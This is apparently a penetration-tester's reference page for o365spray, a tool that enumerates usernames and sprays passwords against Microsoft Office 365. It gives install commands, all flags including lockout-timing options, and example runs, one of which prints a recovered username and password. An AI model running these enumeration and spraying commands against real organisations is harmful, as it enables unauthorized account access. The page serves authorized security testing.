---
title : "O365spray"
# pre : ' '
description : "o365spray | Microsoft O365 User Enumerator and Password Sprayer."
date : 2021-11-03T20:53:22+01:00
# hidden : true
# draft : true
weight : 150
tags : ['M365', 'Passwordspray']
---

---

o365spray a username enumeration and password spraying tool aimed at Microsoft Office 365 (O365). This tool reimplements a collection of enumeration and spray techniques researched and identified by those mentioned in [Acknowledgments](https://github.com/0xZDH/o365spray#Acknowledgments).

> WARNING: The oAuth2 module for user enumeration is performed by submitting a single authentication attempt per user. If the module is run in conjunction with password spraying in a single execution, o365spray will automatically reset the lockout timer prior to performing the password spray -- if enumeration is run alone, the user should be aware of how many and when each authentication attempt was made and manually reset the lockout timer before performing any password spraying.

## Installation

```plain
git clone https://github.com/0xZDH/o365spray
python3 -m pip install -r requirements.txt
```

## Usage

```plain
o365spray.py [-h] [-d DOMAIN] [--validate] [--enum] [--spray] [-u USERNAME] [-p PASSWORD] [-U USERFILE] [-P PASSFILE] [--paired PAIRED] [-c COUNT] [-l LOCKOUT] [--enum-module {office,onedrive,oauth2}]
                    [--spray-module {oauth2,activesync,autodiscover,reporting,adfs}] [--adfs-url ADFS_URL] [--sleep [-1, 0-120]] [--jitter [0-100]] [--rate RATE] [--safe SAFE] [--timeout TIMEOUT] [--proxy PROXY] [--output OUTPUT]
                    [-v] [--debug]
```

## Flags

```plain
o365spray | Microsoft O365 User Enumerator and Password Sprayer -- v2.0.4

optional arguments:
  -h, --help            show this help message and exit
  -d DOMAIN, --domain DOMAIN
                        Target domain for validation, user enumeration, and/or password spraying.
  --validate            Run domain validation only.
  --enum                Run username enumeration.
  --spray               Run password spraying.
  -u USERNAME, --username USERNAME
                        Username(s) delimited using commas.
  -p PASSWORD, --password PASSWORD
                        Password(s) delimited using commas.
  -U USERFILE, --userfile USERFILE
                        File containing list of usernames.
  -P PASSFILE, --passfile PASSFILE
                        File containing list of passwords.
  --paired PAIRED       File containing list of credentials in username:password format.
  -c COUNT, --count COUNT
                        Number of password attempts to run per user before resetting the lockout account timer. Default: 1
  -l LOCKOUT, --lockout LOCKOUT
                        Lockout policy's reset time (in minutes). Default: 15 minutes
  --enum-module {office,onedrive,oauth2}
                        Specify which enumeration module to run. Default: office
  --spray-module {oauth2,activesync,autodiscover,reporting,adfs}
                        Specify which password spraying module to run. Default: oauth2
  --adfs-url ADFS_URL   AuthURL of the target domain's ADFS login page for password spraying.
  --sleep [-1, 0-120]   Throttle HTTP requests every `N` seconds. This can be randomized by passing the value `-1` (between 1 sec and 2 mins). Default: 0
  --jitter [0-100]      Jitter extends --sleep period by percentage given (0-100). Default: 0
  --rate RATE           Number of concurrent connections (attempts) during enumeration and spraying. Default: 10
  --safe SAFE           Terminate password spraying run if `N` locked accounts are observed. Default: 10
  --timeout TIMEOUT     HTTP request timeout in seconds. Default: 25
  --proxy PROXY         HTTP/S proxy to pass traffic through (e.g. http://127.0.0.1:8080).
  --output OUTPUT       Output directory for results and test case files. Default: current directory
  -v, --version         Print the tool version.
  --debug               Enable debug output.
```

## Examples

### Validate domain

```plain
$ python3 o365spray.py -d offsec.nl --validate

            *** O365 Spray ***            

>----------------------------------------<

   > version        :  2.0.4
   > domain         :  offsec.nl
   > validate       :  True
   > timeout        :  25 seconds
   > start          :  2021-11-03 20:52:48

>----------------------------------------<

[2021-11-03 20:52:48,396] INFO : Running O365 validation for: offsec.nl
[2021-11-03 20:52:48,652] INFO : [WARNING] The following domain is using O365, but is Federated: offsec.nl
        [!] --> ADFS AuthURL: https://offsec.okta-emea.com/app/office365/
```

### Passwordspray over ActiveSync

```plain
$ python3 o365spray.py -d offsec.nl -u john.do --paired usercreds.txt --spray-module activesync --spray

            *** O365 Spray ***            

>----------------------------------------<

   > version        :  2.0.4
   > domain         :  offsec.nl
   > spray          :  True
   > username       :  john.do
   > paired         :  usercreds.txt
   > count          :  1 passwords/spray
   > lockout        :  15.0 minutes
   > spray_module   :  activesync
   > rate           :  10 threads
   > safe           :  10 locked accounts
   > timeout        :  25 seconds
   > start          :  2021-11-03 21:00:26

>----------------------------------------<

[2021-11-03 21:00:26,533] INFO : Running O365 validation for: offsec.nl
[2021-11-03 21:00:26,736] INFO : [WARNING] The following domain is using O365, but is Federated: offsec.nl
        [!] --> ADFS AuthURL: https://offsec.okta-emea.com/app/office365/
[2021-11-03 21:00:26,736] INFO : 

[ ? ]   Switch to the ADFS module for password spraying [Y/n] n
[2021-11-03 21:00:30,062] INFO : Running password spray against 1 users.
[2021-11-03 21:00:30,063] INFO : Password spraying using paired usernames:passwords.
[2021-11-03 21:00:30,498] INFO : [VALID] john.do@offsec.nl:Welkom1234!
[2021-11-03 21:00:30,499] INFO : 

[ * ] Writing valid credentials to: '/o365spray/spray/spray_valid_credentials.2111032100.txt'
[ * ] All sprayed credentials can be found at: '/o365spray/spray/spray_tested_credentials.2111032100.txt'

[2021-11-03 21:00:30,499] INFO : Valid Credentials: 1
```

## URL List

- [Github.com - o365spray](https://github.com/0xZDH/o365spray)
